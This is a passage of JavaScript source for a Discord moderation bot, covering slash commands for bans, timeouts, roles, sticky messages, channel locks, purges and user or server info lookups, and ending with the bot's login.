      const reason = options.getString('reason') || 'No reason provided';

      await target.timeout(null, reason);
      await sendDMNotification(target.user, guild, 'Untimeout', reason, interaction.user);

      await createCase(guild, { targetId: target.id, targetTag: target.user.tag, moderatorId: interaction.user.id, moderatorTag: interaction.user.tag, type: 'Untimeout', reason });
      return interaction.reply({ content: `✅ Removed timeout from **${target.user.tag}**.`, flags: MessageFlags.Ephemeral });
    }

    // --------------------------------------------------------------
    // /automod
    // --------------------------------------------------------------
    if (commandName === 'automod') {
      if (!isAdmin(interaction)) return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      const filter = options.getString('filter');
      const enabled = options.getBoolean('enabled');

      settingsCache[guild.id].automod[filter] = enabled;
      await saveSettings(settingsCache);

      return interaction.reply({ content: `✅ AutoMod filter **${filter}** is now **${enabled ? 'ENABLED' : 'DISABLED'}**.`, flags: MessageFlags.Ephemeral });
    }

    // --------------------------------------------------------------
    // /massban
    // --------------------------------------------------------------
    if (commandName === 'massban') {
      if (!hasPermission(interaction, PermissionFlagsBits.BanMembers)) return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      const rawIds = options.getString('ids').split(/\s+/);
      const reason = options.getString('reason') || 'Massban protocol executed';

      let bannedCount = 0;
      for (const id of rawIds) {
        if (/^\d{17,19}$/.test(id)) {
          await guild.members.ban(id, { reason }).catch(() => null);
          bannedCount++;
        }
      }

      return interaction.reply({ content: `✅ Massban complete. Banned **${bannedCount}** user IDs.`, flags: MessageFlags.Ephemeral });
    }

    // --------------------------------------------------------------
    // /case
    // --------------------------------------------------------------
    if (commandName === 'case') {
      const caseId = options.getInteger('id');
      const entry = (settingsCache[guild.id].cases || []).find(c => c.id === caseId);

      if (!entry) return interaction.reply({ content: `❌ Case #${caseId} not found.`, flags: MessageFlags.Ephemeral });

      const embed = new EmbedBuilder()
        .setTitle(`📋 Case #${entry.id} — ${entry.type}`)
        .addFields(
          { name: 'Target', value: `${entry.targetTag} (${entry.targetId})`, inline: true },
          { name: 'Moderator', value: `${entry.moderatorTag} (${entry.moderatorId})`, inline: true },
          { name: 'Reason', value: entry.reason },
          { name: 'Date', value: new Date(entry.date).toUTCString() }
        )
        .setColor('#3498DB');

      return interaction.reply({ embeds: [embed] });
    }

    // --------------------------------------------------------------
    // /modstats
    // --------------------------------------------------------------
    if (commandName === 'modstats') {
      const target = options.getUser('target') || interaction.user;
      const cases = (settingsCache[guild.id].cases || []).filter(c => c.moderatorId === target.id);

      const stats = { Warn: 0, Kick: 0, Ban: 0, Timeout: 0 };
      cases.forEach(c => { if (stats[c.type] !== undefined) stats[c.type]++; });

      const embed = new EmbedBuilder()
        .setTitle(`📊 Staff Action Stats — ${target.tag}`)
        .addFields(
          { name: 'Warnings Issued', value: `${stats.Warn}`, inline: true },
          { name: 'Kicks Executed', value: `${stats.Kick}`, inline: true },
          { name: 'Bans Issued', value: `${stats.Ban}`, inline: true },
          { name: 'Timeouts Issued', value: `${stats.Timeout}`, inline: true },
          { name: 'Total Recorded Actions', value: `${cases.length}`, inline: false }
        )
        .setColor('#9B59B6');

      return interaction.reply({ embeds: [embed] });
    }

    // --------------------------------------------------------------
    // /role
    // --------------------------------------------------------------
    if (commandName === 'role') {
      if (!hasPermission(interaction, PermissionFlagsBits.ManageRoles)) return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      const subcommand = options.getSubcommand();
      const target = options.getMember('target');
      const role = options.getRole('role');

      if (subcommand === 'add') {
        await target.roles.add(role);
        return interaction.reply({ content: `✅ Added **${role.name}** to **${target.user.tag}**.`, flags: MessageFlags.Ephemeral });
      }

      if (subcommand === 'remove') {
        await target.roles.remove(role);
        return interaction.reply({ content: `🗑️ Removed **${role.name}** from **${target.user.tag}**.`, flags: MessageFlags.Ephemeral });
      }
    }

    // --------------------------------------------------------------
    // /temprole
    // --------------------------------------------------------------
    if (commandName === 'temprole') {
      if (!hasPermission(interaction, PermissionFlagsBits.ManageRoles)) return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      const target = options.getMember('target');
      const role = options.getRole('role');
      const minutes = options.getInteger('minutes');

      await target.roles.add(role);
      interaction.reply({ content: `⏳ Granted **${role.name}** to **${target.user.tag}** for ${minutes} minutes.`, flags: MessageFlags.Ephemeral });

      setTimeout(async () => {
        await target.roles.remove(role).catch(() => null);
      }, minutes * 60 * 1000);
      return;
    }

    // --------------------------------------------------------------
    // /embed
    // --------------------------------------------------------------
    if (commandName === 'embed') {
      if (!hasPermission(interaction, PermissionFlagsBits.ManageMessages)) return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      const title = options.getString('title');
      const description = options.getString('description');
      const color = options.getString('color') || '#5865F2';
      const channel = options.getChannel('channel') || interaction.channel;

      const embed = new EmbedBuilder().setTitle(title).setDescription(description).setColor(color);
      await channel.send({ embeds: [embed] });
      return interaction.reply({ content: `✅ Embed delivered to ${channel}.`, flags: MessageFlags.Ephemeral });
    }

    // --------------------------------------------------------------
    // /poll
    // --------------------------------------------------------------
    if (commandName === 'poll') {
      const question = options.getString('question');
      const embed = new EmbedBuilder().setTitle('📊 Community Poll').setDescription(question).setColor('#F1C40F').setTimestamp();

      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('poll_yes').setLabel('Yes').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId('poll_no').setLabel('No').setStyle(ButtonStyle.Danger)
      );

      return interaction.reply({ embeds: [embed], components: [row] });
    }

    // --------------------------------------------------------------
    // /sticky
    // --------------------------------------------------------------
    if (commandName === 'sticky') {
      if (!hasPermission(interaction, PermissionFlagsBits.ManageMessages)) return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      const subcommand = options.getSubcommand();

      if (subcommand === 'set') {
        const msgText = options.getString('message');
        settingsCache[guild.id].stickies[interaction.channel.id] = { text: msgText, lastMessageId: null };
        await saveSettings(settingsCache);
        return interaction.reply({ content: `📌 Sticky message set for this channel.`, flags: MessageFlags.Ephemeral });
      }

      if (subcommand === 'clear') {
        delete settingsCache[guild.id].stickies[interaction.channel.id];
        await saveSettings(settingsCache);
        return interaction.reply({ content: `🗑️ Sticky message removed from this channel.`, flags: MessageFlags.Ephemeral });
      }
    }

    // --------------------------------------------------------------
    // INFO & UTILITY COMMANDS
    // --------------------------------------------------------------
    if (commandName === 'history') {
      const target = options.getUser('target');
      const cases = (settingsCache[guild.id].cases || []).filter(c => c.targetId === target.id).slice(-15).reverse();
      const desc = cases.length ? cases.map(c => `**Case #${c.id} — ${c.type}**\nReason: ${c.reason}\n*Mod: ${c.moderatorTag}*`).join('\n\n') : 'No history found.';
      return interaction.reply({ embeds: [new EmbedBuilder().setTitle(`📚 Moderation History — ${target.tag}`).setDescription(desc).setColor('#3498DB')], flags: MessageFlags.Ephemeral });
    }

    if (commandName === 'reason') {
      const caseId = options.getInteger('case');
      const newReason = options.getString('reason');
      const entry = (settingsCache[guild.id].cases || []).find(c => c.id === caseId);
      if (!entry) return interaction.reply({ content: `❌ Case #${caseId} not found.`, flags: MessageFlags.Ephemeral });
      entry.reason = newReason;
      await saveSettings(settingsCache);
      return interaction.reply({ content: `✅ Case #${caseId} reason updated.`, flags: MessageFlags.Ephemeral });
    }

    if (commandName === 'purge') {
      if (!hasPermission(interaction, PermissionFlagsBits.ManageMessages)) return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      const amount = options.getInteger('amount');
      await interaction.channel.bulkDelete(amount, true);
      return interaction.reply({ content: `🗑️ Deleted ${amount} messages.`, flags: MessageFlags.Ephemeral });
    }

    if (commandName === 'lock') {
      if (!hasPermission(interaction, PermissionFlagsBits.ManageChannels)) return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      const ch = options.getChannel('channel') || interaction.channel;
      await ch.permissionOverwrites.edit(guild.roles.everyone, { SendMessages: false });
      return interaction.reply({ content: `🔒 Locked ${ch}.` });
    }

    if (commandName === 'unlock') {
      if (!hasPermission(interaction, PermissionFlagsBits.ManageChannels)) return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      const ch = options.getChannel('channel') || interaction.channel;
      await ch.permissionOverwrites.edit(guild.roles.everyone, { SendMessages: null });
      return interaction.reply({ content: `🔓 Unlocked ${ch}.` });
    }

    if (commandName === 'slowmode') {
      if (!hasPermission(interaction, PermissionFlagsBits.ManageChannels)) return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      const seconds = options.getInteger('seconds');
      const ch = options.getChannel('channel') || interaction.channel;
      await ch.setRateLimitPerUser(seconds);
      return interaction.reply({ content: `⏱️ Set slowmode to ${seconds}s in ${ch}.`, flags: MessageFlags.Ephemeral });
    }

    if (commandName === 'nick') {
      if (!hasPermission(interaction, PermissionFlagsBits.ManageNicknames)) return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      const target = options.getMember('target');
      const nick = options.getString('nickname');
      await target.setNickname(nick);
      return interaction.reply({ content: `✅ Updated nickname for **${target.user.tag}**.`, flags: MessageFlags.Ephemeral });
    }

    if (commandName === 'deafen') {
      if (!hasPermission(interaction, PermissionFlagsBits.DeafenMembers)) return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      const target = options.getMember('target');
      await target.voice.setDeaf(true);
      return interaction.reply({ content: `🔇 Deafened **${target.user.tag}**.`, flags: MessageFlags.Ephemeral });
    }

    if (commandName === 'undeafen') {
      if (!hasPermission(interaction, PermissionFlagsBits.DeafenMembers)) return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      const target = options.getMember('target');
      await target.voice.setDeaf(false);
      return interaction.reply({ content: `🔊 Undeafened **${target.user.tag}**.`, flags: MessageFlags.Ephemeral });
    }

    if (commandName === 'move') {
      if (!hasPermission(interaction, PermissionFlagsBits.MoveMembers)) return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      const target = options.getMember('target');
      const channel = options.getChannel('channel');
      await target.voice.setChannel(channel);
      return interaction.reply({ content: `🚚 Moved **${target.user.tag}** to ${channel}.`, flags: MessageFlags.Ephemeral });
    }

    if (commandName === 'userinfo') {
      const target = options.getMember('target') || interaction.member;
      const embed = new EmbedBuilder()
        .setTitle(`👤 ${target.user.tag}`)
        .setThumbnail(target.user.displayAvatarURL())
        .addFields(
          { name: 'ID', value: target.id, inline: true },
          { name: 'Joined Server', value: `<t:${Math.floor(target.joinedTimestamp / 1000)}:R>`, inline: true },
          { name: 'Account Created', value: `<t:${Math.floor(target.user.createdTimestamp / 1000)}:R>`, inline: true }
        )
        .setColor('#5865F2');
      return interaction.reply({ embeds: [embed] });
    }

    if (commandName === 'avatar') {
      const target = options.getUser('target') || interaction.user;
      return interaction.reply({ embeds: [new EmbedBuilder().setTitle(`${target.tag}'s Avatar`).setImage(target.displayAvatarURL({ size: 512 })).setColor('#5865F2')] });
    }

    if (commandName === 'serveravatar') {
      const target = options.getMember('target') || interaction.member;
      const url = target.avatarURL({ size: 512 }) || target.user.displayAvatarURL({ size: 512 });
      return interaction.reply({ embeds: [new EmbedBuilder().setTitle(`${target.user.tag}'s Server Avatar`).setImage(url).setColor('#5865F2')] });
    }

    if (commandName === 'banner') {
      const target = await client.users.fetch(options.getUser('target')?.id || interaction.user.id, { force: true });
      if (!target.bannerURL()) return interaction.reply({ content: '❌ User has no banner set.', flags: MessageFlags.Ephemeral });
      return interaction.reply({ embeds: [new EmbedBuilder().setTitle(`${target.tag}'s Banner`).setImage(target.bannerURL({ size: 512 })).setColor('#5865F2')] });
    }

    if (commandName === 'membercount') {
      return interaction.reply({ embeds: [new EmbedBuilder().setTitle('📊 Member Count').setDescription(`Total Members: **${guild.memberCount}**`).setColor('#5865F2')] });
    }

    if (commandName === 'roleinfo') {
      const role = options.getRole('role');
      const embed = new EmbedBuilder()
        .setTitle(`🔑 Role: ${role.name}`)
        .addFields(
          { name: 'ID', value: role.id, inline: true },
          { name: 'Position', value: `${role.position}`, inline: true },
          { name: 'Members', value: `${role.members.size}`, inline: true }
        )
        .setColor(role.hexColor);
      return interaction.reply({ embeds: [embed] });
    }

    if (commandName === 'channelinfo') {
      const ch = options.getChannel('channel') || interaction.channel;
      const embed = new EmbedBuilder()
        .setTitle(`💬 Channel: #${ch.name}`)
        .addFields(
          { name: 'ID', value: ch.id, inline: true },
          { name: 'Type', value: `${ch.type}`, inline: true }
        )
        .setColor('#5865F2');
      return interaction.reply({ embeds: [embed] });
    }

    if (commandName === 'settings') {
      const config = settingsCache[guild.id] || {};
      const embed = new EmbedBuilder()
        .setTitle(`⚙️ Configuration for ${guild.name}`)
        .addFields(
          { name: 'Log Channel', value: config.logChannelId ? `<#${config.logChannelId}>` : 'Not Set', inline: true },
          { name: 'Admin Roles', value: config.adminRoleIds?.length ? config.adminRoleIds.map(id => `<@&${id}>`).join(', ') : 'Not Set', inline: true }
        )
        .setColor('#5865F2');
      return interaction.reply({ embeds: [embed], flags: MessageFlags.Ephemeral });
    }

  } catch (err) {
    console.error(`[Command Error: /${commandName}]`, err);
    if (!interaction.replied) {
      await interaction.reply({ content: '❌ An unexpected internal error occurred while executing this command.', flags: MessageFlags.Ephemeral }).catch(() => null);
    }
  }
});

// ------------------------------------------------------------------
// 10. BOT LOGIN
// ------------------------------------------------------------------
client.login(process.env.DISCORD_TOKEN || process.env.TOKEN);
